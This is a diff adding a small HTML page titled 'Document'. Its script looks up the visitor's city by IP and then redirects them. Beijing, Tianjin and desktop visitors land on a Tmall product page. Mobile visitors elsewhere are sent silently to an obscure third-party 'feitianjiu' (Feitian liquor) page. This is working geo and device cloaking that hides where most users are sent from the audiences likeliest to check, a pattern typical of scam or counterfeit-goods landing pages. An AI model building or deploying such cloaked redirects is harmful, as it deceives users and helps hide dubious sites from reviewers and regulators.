@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>Document</title>
+</head>
+<body onload="ScreenWidth()">
+	<script src="http://pv.sohu.com/cityjson?ie=utf-8"></script>
+	<script language="JavaScript">
+	function ScreenWidth(){
+		var city = returnCitySN.cname;
+		if( (city.indexOf('北京市') >= 0) || (city.indexOf('天津市') >= 0) ){
+			window.location.href = 'https://chaoshi.detail.tmall.com/item.htm?spm=a3204.7933263.0.0.jcWWk0&id=529164162765&rewcatid=50514008';
+		}else{
+			if (screen.width <= 768){
+			    window.location.href = 'http://ok.sjxhfkyy.com/p/feitianjiu';
+			}else {
+			    window.location.href = 'https://chaoshi.detail.tmall.com/item.htm?spm=a3204.7933263.0.0.jcWWk0&id=529164162765&rewcatid=50514008';
+			}
+		}
+		
+	}
+	</script>
+</body>
+</html>
